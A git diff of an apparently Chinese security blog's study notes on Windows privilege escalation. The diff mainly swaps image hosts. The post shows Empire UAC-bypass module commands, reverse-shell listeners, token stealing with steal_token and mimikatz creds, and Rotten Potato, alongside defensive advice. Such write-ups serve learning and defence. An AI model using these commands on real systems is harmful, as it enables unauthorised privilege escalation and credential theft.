 <p>除了上述说的<code>sysprep</code>方法，还有以下方法：<code>sysprep、oobe、ActionQueue、migwiz、cliconfg、winsat、mmc</code>。</p>
 <p>正常情况下<code>whoami /all</code>：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144842084.png" alt="image-20220130144842084"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144842084.png" alt="image-20220130144842084"></p>
 <p>提权成功运行结果:</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144915465.png" alt="image-20220130144915465"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220130144939493.png" alt="image-20220130144939493"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144915465.png" alt="image-20220130144915465"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220130144939493.png" alt="image-20220130144939493"></p>
 <h3 id="4-4-5-Empire-中的-BypassUAC模块"><a href="#4-4-5-Empire-中的-BypassUAC模块" class="headerlink" title="4.4.5 Empire 中的 BypassUAC模块"></a>4.4.5 <code>Empire</code> 中的 <code>BypassUAC</code>模块</h3><h5 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1. bypassuac"></a>1. <code>bypassuac</code></h5><p>​        在 <code>Empire </code>中输入<code>usemodule powershell/privesc/bypassuac</code>命令，设置监听器的参数。执行<code>execute</code><br>命令，得到一个新的反弹 <code>Shell</code>，带星号的 <code>agents</code>就是提权成功:</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131170622961.png" alt="image-20220131170622961"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131170622961.png" alt="image-20220131170622961"></p>
 <h5 id="2-bypassuac-wscript"><a href="#2-bypassuac-wscript" class="headerlink" title="2. bypassuac_wscript"></a>2. <code>bypassuac_wscript</code></h5><p>​        该模块的大致工作原理是，使用<code>C:\Windows\wscript.exe</code> 执行<code>Payload</code>，即绕过<code>UAC</code>，以管理员权限执行<code>Payload</code>。该模块只适用于操作系统为<code>Windows7</code>的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。</p>
 <pre><code class="hljs powershell">interact <span class="hljs-number">42</span>NUDT5B
 usemodule privesc/bypassuac_wscript
 <span class="hljs-built_in">set</span> Listener test
 run</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131195208479.png" alt="image-20220131195208479"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131195208479.png" alt="image-20220131195208479"></p>
 <h3 id="4-4-6-针对UAC提权的防御分析"><a href="#4-4-6-针对UAC提权的防御分析" class="headerlink" title="4.4.6 针对UAC提权的防御分析"></a>4.4.6 针对<code>UAC</code>提权的防御分析</h3><p>​        在企业网络环境中，防止绕过 <code>UAC</code> 的最好的方法是<strong>不让内网机器的使用者拥有本地管理员权限</strong>，从而降低系统遭受攻击的可能性。在家庭网络环境中，建议使用<strong>非管理员权限</strong>进行日常办公和娱乐等活动。使用本地管理员权限登录的用户，要将 <code>UAC</code> 设置为“始终通知”或者删除该用户的本地管理员权限（这样设置后，会像在<code>Windows Vista</code> 中一样，总是弹出警告）。另外，可以使用微软的<code>EMET</code>或<code>MalwareBytes</code>来更好地防范<code>0day</code>漏洞。</p>
 <p>​        对于<code>DLL</code>劫持<code>BypassUAC</code>来说，可以重命名或删除<code>Mcx2Prov.exe、 sysprep.exe、 cliconfg.exe、pwcreator.exe</code> 等可执行文件。</p>
 <h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><p>​        令牌（<code>Token</code>）是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中（除非系统重新启动）。</p>
 <p>​        令牌的最大特点是随机性和不可预测性。一般的攻击者或软件都无法将令牌猜测出来。访问令牌（Access Token）代表访问控制操作主体的系统对象。密保令牌（<code>Security Tolten</code>）也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。会话令牌（Session Token）是交互会话中唯一的身份标识符。</p>
 <p>​        伪造令牌攻击的核心是<code>Kerberos</code>协议。<code>Kerberos</code>是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。<code>Kerberos</code> 协议的工作机制如下:</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131185944615.png" alt="image-20220131185944615"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131185944615.png" alt="image-20220131185944615"></p>
 <p>客户端请求证书的过程如下：</p>
 <ol>
 <li>客户端向认证服务器发送请求，要求得到证书。</li>
@@ -1008,8 +1008,8 @@ list_tokens -u
 # 恢复权限
 rev2self</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131223826391.png" alt="image-20220131223826391"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131223846568.png" alt="image-20220131223846568"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131223826391.png" alt="image-20220131223826391"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131223846568.png" alt="image-20220131223846568"></p>
 <h3 id="4-5-2-Rotten-Potato-本地提权分析"><a href="#4-5-2-Rotten-Potato-本地提权分析" class="headerlink" title="4.5.2 Rotten Potato 本地提权分析"></a>4.5.2 <code>Rotten Potato</code> 本地提权分析</h3><p>如果目标系统中存在有效的令牌，可以通过<code>Rotten Potato</code> 程序快速模拟用户令牌来实现权限的提升。</p>
 <p>repo：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></p>
 <pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 加载模块</span>
@@ -1048,11 +1048,11 @@ run
 mimikatz
 creds</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131205413922.png" alt="image-20220131205413922"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131205413922.png" alt="image-20220131205413922"></p>
 <p>使用<code>pth&lt;ID&gt;</code>命令（这里的ID就是<code>creds</code> 下的<code> CredID</code> ），窃取身份令牌。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131210226622.png" alt="image-20220131210226622"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131210226622.png" alt="image-20220131210226622"></p>
 <p>使用 <code>ps </code>命令查看当前是否有域用户的进程正在运行，当前存在域用户的进程。选择名称为 <code>exploere</code>、<code>PID</code> 为 2496 的进程:</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131210758443.png" alt="image-20220131210758443"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131210758443.png" alt="image-20220131210758443"></p>
 <pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 获取这个令牌</span>
 steal_token 
 <span class="hljs-meta">#</span><span class="bash"> 恢复令牌的权限</span>
@@ -1205,7 +1205,7 @@ revtoself</code></pre>
   <div class="widget-wrap widget-cate">
     <div class="widget-title"><span>Categories</span></div>
     <div class="widget-inner">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
     </div>
   </div>
 
@@ -1228,23 +1228,23 @@ revtoself</code></pre>
       <ul>
         
           <li>
+            <a href="/896645eb.html">内网学习笔记七 | 跨域攻击分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/83b61d10.html">内网学习笔记六 | 域控制器安全</a>
+          </li>
+        
+          <li>
+            <a href="/f9f7ea1f.html">内网学习笔记八 | 权限维持分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/687f7c3.html">内网学习笔记五 | 域内横向移动分析及防御</a>
+          </li>
+        
+          <li>
             <a href="/1ed1a532.html">向日葵RCE复现</a>
-          </li>
-        
-          <li>
-            <a href="/334b21e6.html">钉钉RCE复现</a>
-          </li>
-        
-          <li>
-            <a href="/fd778797.html">Xray扫描结果整理小脚本分享</a>
-          </li>
-        
-          <li>
-            <a href="/401ba385.html">内网学习笔记四 | 权限提升分析及防御</a>
-          </li>
-        
-          <li>
-            <a href="/ddad802f.html">2021-12月CISP-PTE考试总结</a>
           </li>
         
       </ul>
